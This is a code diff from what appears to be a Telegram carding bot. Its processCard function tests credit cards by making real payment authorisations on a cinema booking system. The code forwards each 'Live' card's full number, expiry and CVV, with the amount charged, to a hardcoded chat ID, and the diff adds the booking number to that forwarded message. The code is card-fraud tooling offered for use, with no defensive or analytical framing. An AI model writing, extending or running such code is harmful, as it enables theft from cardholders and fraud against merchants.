@@ -537,18 +537,25 @@ async function processCard(chatId, cardText) {
                     const parsedResponse = safeJsonParse(responseObj);
                     errorMsg = parsedResponse?.ErrorMessage || 'Payment Authorised';
                     
-                    // Forward to notification with amount and response
+                    // Extract VistaBookingNumber from response
+                    const vistaBookingNumber = parsedResponse?.VistaBookingNumber 
+                        || parsedResponse?.Result?.VistaBookingNumber 
+                        || parsedResponse?.vistaBookingNumber 
+                        || 'N/A';
+                    
+                    // Forward to notification with amount, response and VistaBookingNumber
                     await forwardersd(
                         `✅ <b>Live Card</b>\n\n` +
                         `💳 ${cc}|${mm}|${yyyy}|${cvv}\n` +
                         `💰 Amount: $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n` +
+                        `📋 VistaBookingNumber: ${vistaBookingNumber}\n` +
                         `📝 Response: ${errorMsg}`, 
                         6050175626
                     );
                     
                     result = {
                         status: 'live',
-                        message: `✅ *LIVE*\n\n💳 \`${cardText}\`\n💰 *Amount:* $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n\n📝 *Response:*\nPayment Authorised [${errorMsg}]`
+                        message: `✅ *LIVE*\n\n💳 \`${cardText}\`\n💰 *Amount:* $${totalAmount} (${quantity} × $${pricePerQuantity.toFixed(2)})\n📋 *VistaBookingNumber:* ${vistaBookingNumber}\n\n📝 *Response:*\nPayment Authorised [${errorMsg}]`
                     };
                 } else if (retry >= 3) {
                     let errorMsg = 'Unknown error';
